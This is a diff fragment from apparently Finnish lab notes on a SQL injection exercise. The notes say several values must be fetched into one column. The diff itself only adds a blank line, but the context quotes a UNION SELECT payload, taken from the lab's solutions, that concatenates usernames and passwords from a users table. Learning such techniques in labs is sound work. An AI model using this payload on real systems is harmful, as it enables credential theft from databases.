@@ -271,6 +271,7 @@ Tehtävässä pitää saada useita arvoja yhdelle sarakkeelle.
 
 
 Labin solutions kohdasta löysin komennon:
+
 '+UNION+SELECT+NULL,username|| '-' ||password+FROM+users--
 
 
